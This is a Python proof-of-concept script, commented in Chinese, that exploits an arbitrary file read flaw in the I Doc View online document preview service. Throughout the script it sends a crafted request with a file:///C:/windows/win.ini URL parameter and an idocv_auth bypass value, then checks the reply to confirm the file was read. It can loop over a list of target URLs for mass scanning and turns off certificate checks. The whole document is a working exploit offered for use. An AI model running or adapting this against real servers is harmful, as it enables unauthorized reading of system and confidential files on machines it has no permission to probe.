#I doc view——任意文件读取
#title="在线文档预览 - I Doc View"

import requests
import argparse
import time
from urllib3.exceptions import InsecureRequestWarning

RED = '\033[91m'
RESET = '\033[0m'

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def check_vulnerability(url):
    proxies = {
    'http':'http://127.0.0.1:7890',
    'https':'https://127.0.0.1:7890',
}
    try:
        attack_url = url.rstrip('/') + "/view/qJvqhFt.json?start=1&size=5&url=file%3A%2F%2F%2FC%3A%2Fwindows%2Fwin.ini&idocv_auth=sapi"
        response = requests.get(attack_url, verify=False, timeout=10, proxies=proxies)
        
        if response.status_code == 200 and 'fonts' in response.text:
            print(f"{RED}URL [{url}] 可能存在I Doc View 在线文档预览 qJvqhFt.json 任意文件读取漏洞{RESET}")
        else:
            print(f"URL [{url}] 不存在漏洞")
    except requests.exceptions.Timeout:
        print(f"URL [{url}] 请求超时，可能存在漏洞")
    except requests.RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在I Doc View 在线文档预览 qJvqhFt.json 任意文件读取漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_vulnerability(url)

if __name__ == '__main__':
    main()
